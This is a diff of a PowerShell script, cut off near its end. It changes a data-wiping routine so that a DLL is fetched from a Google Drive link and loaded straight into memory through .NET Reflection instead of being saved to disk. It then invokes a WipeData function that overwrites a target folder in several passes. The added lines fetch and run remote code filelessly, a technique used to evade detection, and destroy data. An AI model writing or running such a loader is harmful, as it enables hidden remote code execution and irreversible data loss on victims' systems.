@@ -1,26 +1,23 @@
-# Download the DLL from a remote URL and save to disk
-$url = "https://drive.google.com/uc?export=download&id=XXXX" # Replace XXXX with actual ID
-$dllPath = "$env:TEMP\DataWiperDll.dll"
-Invoke-WebRequest -Uri $url -OutFile $dllPath
+# Download the DLL into memory
+$url = "https://drive.google.com/uc?export=download&id=XXXX" # Replace XXXX with real ID
+$webClient = New-Object System.Net.WebClient
+$dllBytes = $webClient.DownloadData($url)
 
-# Define the P/Invoke signature for the DLL's exported function
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class DataWiper {
-    [DllImport(@"$dllPath", CharSet = CharSet.Unicode)]
-    public static extern bool WipeData(string targetPath, int passes);
-}
-"@
+# Load the DLL into memory using .NET Reflection
+$assembly = [System.Reflection.Assembly]::Load($dllBytes)
 
-# Set parameters for wiping
-$targetPath = "C:\SensitiveData" # Replace with your target file or folder
-$passes = 3                      # Number of wipe passes
+# Find the class and method (adjust if needed)
+$type = $assembly.GetType("DataWiper")  # Must match the class name in the DLL
+$method = $type.GetMethod("WipeData")
 
-# Call the exported function from the DLL
-$result = [DataWiper]::WipeData($targetPath, $passes)
+# Set wipe parameters
+$targetPath = "C:\SensitiveData"  # Replace with actual target
+$passes = 3                        # Number of overwrite passes
 
-# Output the result
+# Invoke method from memory-loaded assembly
+$result = $method.Invoke($null, @($targetPath, $passes))
+
+# Output result
 if ($result) {
     Write-Host "Wipe operation succeeded."
 } else {
